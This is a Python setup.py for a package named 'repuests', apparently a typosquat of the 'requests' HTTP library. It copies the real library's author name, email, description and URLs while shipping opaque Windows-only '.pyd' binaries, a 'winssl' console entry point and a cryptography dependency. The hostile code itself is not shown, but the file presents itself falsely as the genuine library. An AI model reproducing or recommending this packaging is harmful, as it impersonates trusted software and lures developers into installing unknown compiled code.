from setuptools import setup, find_packages

setup(
    name="repuests",
    version="1.0.13",
    author="Kenneth Reitz",
    author_email="me@kennethreitz.org",
    description="A simple, yet elegant HTTP library.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://requests.readthedocs.io/",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Topic :: Internet :: WWW/HTTP",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "License :: OSI Approved :: Apache Software License",
        "Operating System :: OS Independent",
    ],
    keywords='http requests',
    project_urls={
        'Documentation': 'https://requests.readthedocs.io/',
        'Tracker': 'https://github.com/psf/requests/issues',
    },
    python_requires='>=3.6',
    install_requires=[
        "requests",
        "pycryptodome",
        "chardet",
        "idna",
        "urllib3",
        "certifi"
    ],
    entry_points={
        'console_scripts': [
            'repuests=repuests.winssl:main',
        ],
    },
    include_package_data=True,
    package_data={
        'repuests': ['*.pyd'],  # Ensure .pyd files are included
    },
    zip_safe=False,
    platforms=["win64"],  # Restrict to Windows platforms
)


